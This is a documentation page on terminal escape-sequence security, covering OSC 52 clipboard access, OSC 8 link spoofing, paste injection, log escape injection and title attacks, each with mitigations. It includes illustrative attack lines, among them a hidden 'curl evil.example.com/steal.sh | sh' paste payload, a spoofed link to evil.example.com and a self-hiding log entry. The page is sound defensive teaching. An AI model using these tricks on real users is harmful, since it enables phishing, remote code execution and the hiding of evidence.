---
outline: deep
prev: false
next: false
---

# Terminal Security

<p class="page-tagline">Attack surfaces hiding in your terminal's escape sequence parser</p>

<div class="beginner-intro">
<p>Terminal emulators interpret escape sequences as instructions — move the cursor, change colors, set the window title, access the clipboard. Most of these are harmless, but some grant surprising capabilities to anything that can write bytes to your terminal. A malicious script, a poisoned log file, or even copied text from a website can exploit these to exfiltrate data, spoof your display, or inject commands. Modern terminals mitigate these risks, but understanding the attack surface matters.</p>
</div>

## OSC 52: Clipboard Access

OSC 52 (`\e]52;c;<base64-data>\a`) lets applications read and write the system clipboard through the terminal. This is genuinely useful — it's how copying works over SSH, in tmux, and in terminal-based editors that can't access the system clipboard directly.

The security problem: any program that can write to stdout can also write to your clipboard. And if clipboard _reading_ is enabled, any program can silently read whatever you last copied — passwords, tokens, private keys.

```bash
# Write "hello" to the clipboard via OSC 52
printf '\e]52;c;%s\a' "$(echo -n 'hello' | base64)"

# Request clipboard contents (if the terminal allows it)
printf '\e]52;c;?\a'
```

**How terminals handle this:**

| Policy                      | Behavior                         | Terminals                       |
| --------------------------- | -------------------------------- | ------------------------------- |
| Write allowed, read blocked | Default in most modern terminals | Ghostty, iTerm2, Kitty, WezTerm |
| Both blocked by default     | Must opt in via settings         | Terminal.app                    |
| Both allowed                | Full access                      | Some older xterm configs        |

Reading the clipboard is the dangerous operation. A compromised process in a tmux session could silently capture anything you copy. Most terminals now block clipboard reads by default and require explicit opt-in.

::: warning What to do

- Verify clipboard read is disabled in your terminal's settings (it usually is by default).
- If you enable OSC 52 read for remote workflows, scope it to specific sessions or hosts.
- Libraries: don't assume OSC 52 read works. Fall back gracefully — check the terminal's response or use platform clipboard tools (`pbcopy`, `xclip`).
  :::

## OSC 8: Hyperlink Spoofing

OSC 8 (`\e]8;params;uri\e\\`) lets terminals render clickable hyperlinks, just like HTML anchor tags. The display text and the URL are independent — the terminal shows one thing but opens another when clicked.

```bash
# Display text says "Google" but the link points elsewhere
printf '\e]8;;https://evil.example.com\e\\Google\e]8;;\e\\'
```

A user sees "Google" as a clickable link in their terminal. Clicking it opens `evil.example.com`. This is the same class of attack as HTML phishing links, but in a context where users may not expect it.

**Where this matters:**

- `git log` output with OSC 8 links to commit URLs
- Build tool output linking to error documentation
- Any CLI that renders URLs from untrusted input (package managers showing dependency URLs, etc.)

::: warning What to do

- Hover before clicking: most terminals show the actual URL on hover (like a browser).
- If your application renders links from untrusted sources, sanitize the URL or display the raw URL alongside the link text.
- Terminal authors: show the real URL in a tooltip or status bar, as browsers do.
  :::

## Paste Injection & Bracketed Paste

Without bracketed paste mode, the terminal sends pasted text through the same channel as keyboard input. The application — or the shell — cannot distinguish pasted text from a user typing quickly. A malicious website can exploit this by putting hidden commands in copied text.

**The attack:** You copy what appears to be a benign command from a web page. Hidden in the HTML (via CSS or zero-width characters) is a newline followed by a malicious command. When you paste into your terminal, the shell executes both commands immediately.

```
# What you think you copied:
ls -la

# What was actually in the clipboard:
ls -la
curl evil.example.com/steal.sh | sh
```

**Bracketed paste mode** (DECSET 2004) solves this by wrapping pasted content in marker sequences:

```
\e[200~    ← paste start marker
...pasted content...
\e[201~    ← paste end marker
```

When enabled, the application receives these markers and knows the enclosed bytes came from a paste, not the keyboard. Shells like zsh and fish use this to show pasted content without executing it until you press Enter.

```bash
# Enable bracketed paste mode
printf '\e[?2004h'

# Disable bracketed paste mode
printf '\e[?2004l'
```

**Current status:** All modern terminals support bracketed paste. Most modern shells enable it by default. The risk is primarily in legacy shells, minimal environments, or applications that don't enable it.

::: warning What to do

- Use a modern shell (zsh, fish, bash 5.1+) — they enable bracketed paste automatically.
- If writing a TUI application that accepts text input, enable mode 2004 and handle the paste markers.
- Be cautious pasting commands from websites. Use a plain text editor as an intermediate step if unsure.
  :::

## Escape Injection in Logs

If untrusted data gets written to a file without sanitization, and that file is later displayed in a terminal, the escape sequences embedded in the data become active. The terminal interprets them as instructions.

**The attack:** An attacker submits a username, HTTP header, or log message containing escape sequences. The sequences sit inert in the log file (they're just bytes). When an admin runs `cat server.log` or pages through it with `less`, the terminal parses them.

Possible effects:

- **Hide evidence**: move the cursor and overwrite lines, making malicious entries invisible
- **Change the title bar**: use OSC 0 to display a fake path or hostname, confusing the admin
- **Alter terminal state**: change colors, enable alternate screen, move the cursor to arbitrary positions
- **Clipboard writes**: inject OSC 52 sequences that overwrite the clipboard

```bash
# A log entry that hides itself when cat'd
echo -e 'normal log line\n\e[1A\e[2K\e[1A\e[2Knormal log line' >> server.log
# The escape sequences move the cursor up and erase lines
```

::: warning What to do

- **Viewing logs**: Use `cat -v` (shows control characters as `^[`), `less -R` (passes through color but blocks most others), or a log viewer that strips escapes.
- **Writing logs**: Sanitize user input before logging. Strip or escape bytes in the 0x00-0x1F range (especially 0x1B/ESC). Most logging libraries do this by default.
- **Piping untrusted data**: Use `| cat -v` or `| sed 's/\x1b\[[0-9;]*[a-zA-Z]//g'` to strip ANSI sequences.
  :::

## Title and Icon Attacks

OSC 0, 1, and 2 set the terminal's window title and icon name:

```bash
# Set window title
printf '\e]0;My Title\a'

# Set icon name only (OSC 1) or title only (OSC 2)
printf '\e]2;My Title\a'
```

If an attacker can write to your terminal (e.g., through a log file, a malicious SSH banner, or crafted data in a pipeline), they can change the window title to display misleading information — a fake hostname, a different directory path, or a spoofed user identity.

Some older terminals also supported _reading_ the title back via a query sequence (OSC 21). This created an injection risk: an attacker could set the title to contain shell commands, then trigger a title query. The terminal would send the title contents back through stdin, where the shell might execute them. Modern terminals have disabled title query responses.

**Current status:** Title setting is generally considered low-risk and is widely allowed. Title _querying_ is blocked by default in all modern terminals due to the injection risk.

::: warning What to do

- Terminal authors: never respond to title query sequences (OSC 21) with the actual title contents. Most modern terminals already block this.
- Users: be aware that window titles can be set by remote content. Don't rely on the title bar to verify which host or directory you're in.
- Sanitize data before passing it to title-setting sequences in your application. Strip control characters and limit the length.
  :::

## Further Reading

- [OSC Sequences](/osc) — the full set of Operating System Command features tested across terminals
- [Terminal Detection](/fundamentals/term-detection) — how applications query terminal capabilities
- [TTY Architecture](/fundamentals/tty-architecture) — the layers between your shell and your terminal

---

<p class="back-link">
  <a href="/fundamentals">&#8592; Back to fundamentals</a>
</p>

<style>
.beginner-intro {
  background: var(--vp-c-bg-soft);
  border-radius: 8px;
  padding: 1em 1.25em;
  margin-bottom: 1.5em;
  font-size: 0.95em;
  line-height: 1.6;
}

.page-tagline {
  font-size: 1.15em;
  color: var(--vp-c-text-2);
  margin-top: -0.5em;
  margin-bottom: 1.5em;
}

.back-link {
  margin-top: 2em;
  font-size: 0.9em;
}

.back-link a {
  color: var(--vp-c-brand-1);
  text-decoration: none;
}

.back-link a:hover {
  text-decoration: underline;
}
</style>
